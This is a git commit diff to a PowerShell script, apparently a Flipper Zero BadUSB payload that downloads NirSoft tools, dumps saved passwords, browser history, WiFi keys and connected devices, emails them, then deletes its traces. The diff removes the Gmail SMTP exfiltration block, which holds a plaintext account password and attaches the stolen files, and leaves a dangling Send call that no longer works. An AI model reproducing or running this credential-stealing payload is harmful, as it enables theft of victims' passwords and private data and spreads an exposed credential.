0690cb5aebfc6fc50f1d4b7d460f729ac5130acd
Hacktivist2023 <132049028+Hacktivist2023@users.noreply.github.com>
2023-06-13 07:38:22 +0200

    update ciaoV2.ps1

--- flipper zero/checked/ciaoV2.ps1
+++ flipper zero/checked/ciaoV2.ps1
@@ -7,20 +7,6 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
-Set mail option
-$SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-$SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nomorepyro@gmail.com', 'jemxJth3') #Email with which you want to send information
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'nomorepyro@gmail.com' #Email in which you want to receice the information
-$ReportEmail.To.Add('nomorepyro@gmail.com') #Email in which you want to receive the information
-$ReportEmail.Subject = 'Get any passwords'
-$ReportEmail.Body = 'Attached is your list of informations.'
-$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\passwords.txt)
-$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\history.txt)
-$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\wifi.txt)
-$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\connected_devices.txt)
 $SMTPInfo.Send($ReportEmail) #Send mail
 Start-Sleep -Seconds 15 #Wait 15 seconds
 #Delete nirsoft tools and .ps1 file
